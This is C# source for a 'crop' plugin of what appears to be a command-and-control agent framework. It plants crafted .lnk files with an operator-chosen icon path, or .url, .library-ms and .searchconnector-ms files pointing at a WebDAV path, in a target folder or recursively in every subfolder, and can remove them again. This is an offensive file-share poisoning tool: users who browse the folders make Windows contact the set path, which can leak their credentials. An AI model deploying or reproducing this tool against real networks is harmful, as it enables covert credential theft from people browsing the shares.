using Crop;
using PluginBase;
namespace Plugin
{
    public static class crop
    {
        public static void Execute(Dictionary<string, object> args)
        {
            var recurse = (bool)args["recurse"];
            var clean = (bool)args["clean"];


            Config.targetLocation = args["targetLocation"].ToString();
            Config.targetFilename = args["targetFilename"].ToString();
            Config.targetPath = args["targetPath"].ToString();
            

            if (!Config.targetLocation.EndsWith("\\"))
                Config.targetLocation = Config.targetLocation + "\\";

            if (Config.targetFilename.EndsWith(".lnk"))
            {
                if (!args.ContainsKey("targetIcon") || string.IsNullOrEmpty(args["targetIcon"].ToString()))
                {
                    PluginHandler.WriteOutput("No Target Icon specified", (string)args["task-id"], true, "error");
                    return;
                }

                Config.targetIcon = args["targetIcon"].ToString().Trim();

                PluginHandler.WriteOutput("[*] Setting LNK value: " + Config.targetIcon, (string)args["task-id"], false);
                PluginHandler.WriteOutput("[*] Icon location: " + Config.targetPath, (string)args["task-id"], false);

                try
                {
                    if (recurse)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            var output = f + Config.targetFilename;
                            PluginHandler.WriteOutput("[*] Writing LNK to: " + output, (string)args["task-id"], false);
                            CropHelper.CreateLNKCrop(output);
                        }
                    }
                    else if (clean)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            if (File.Exists(f + Config.targetFilename))
                            {
                                File.Delete(f + Config.targetFilename);
                                PluginHandler.WriteOutput("[*] Removing file: " + f + Config.targetFilename, (string)args["task-id"], false);
                            }
                        }
                    }
                    else
                    {
                        var output = Config.targetLocation + Config.targetFilename;
                        PluginHandler.WriteOutput("[*] Writing LNK to: " + output, (string)args["task-id"], false);
                        CropHelper.CreateLNKCrop(output);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            else if (Config.targetFilename.ToLower().EndsWith(".url") || Config.targetFilename.ToLower().EndsWith(".library-ms") || Config.targetFilename.ToLower().EndsWith(".searchconnector-ms"))
            {
                PluginHandler.WriteOutput("[*] Setting WebDAV value: " + Config.targetPath, (string)args["task-id"], false);
                try
                {

                    if (recurse)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            var output = f + Config.targetFilename;
                            PluginHandler.WriteOutput("[*] Writing file to: " + output, (string)args["task-id"], false);
                            CropHelper.CreateFileCrop(output);
                        }
                    }
                    else if (clean)
                    {
                        Config.WalkDirectoryTree(Config.targetLocation);
                        foreach (var folder in Config.folders)
                        {
                            var f = folder;
                            if (!folder.EndsWith("\\"))
                                f = folder + "\\";
                            if (File.Exists(f + Config.targetFilename))
                            {
                                File.Delete(f + Config.targetFilename);
                                PluginHandler.WriteOutput("[*] Removing file: " + Config.targetFilename, (string)args["task-id"], false);
                            }
                        }
                    }
                    else
                    {
                        var output = Config.targetLocation + Config.targetFilename;
                        PluginHandler.WriteOutput("[*] Writing file to: " + output, (string)args["task-id"], false);
                        CropHelper.CreateFileCrop(output);
                    }
                }
                catch (Exception e)
                {
                    PluginHandler.WriteOutput(e.ToString(), (string)args["task-id"], true, "error");
                    return;
                }
            }
            else
            {
                Console.WriteLine("not a valid file");
                PluginHandler.WriteOutput("[!] Not a valid file: " + Config.targetFilename, (string)args["task-id"], true, "error");
                return;
            }
            PluginHandler.WriteOutput("[*] Done.", (string)args["task-id"], true);
        }
    }
}